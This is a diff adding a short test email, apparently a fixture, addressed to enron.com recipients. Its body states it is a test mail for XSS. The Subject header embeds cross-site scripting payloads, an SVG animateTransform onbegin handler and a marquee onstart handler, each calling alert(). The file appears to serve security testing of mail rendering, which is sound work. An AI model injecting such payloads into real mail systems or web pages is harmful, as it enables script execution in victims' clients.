@@ -1,0 +1,7 @@
+From: "Eunice Sutherland" <eyewitnessloth@optician.com>
+To: jeff.keeler@enron.com, stacey.bolton@enron.com, mary.schoen@enron.com, 
+Subject: <svg><animateTransform attributeName=transform onbegin=alert(1)>o(∩_∩)o<marquee  onstart=alert(2)></marquee>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
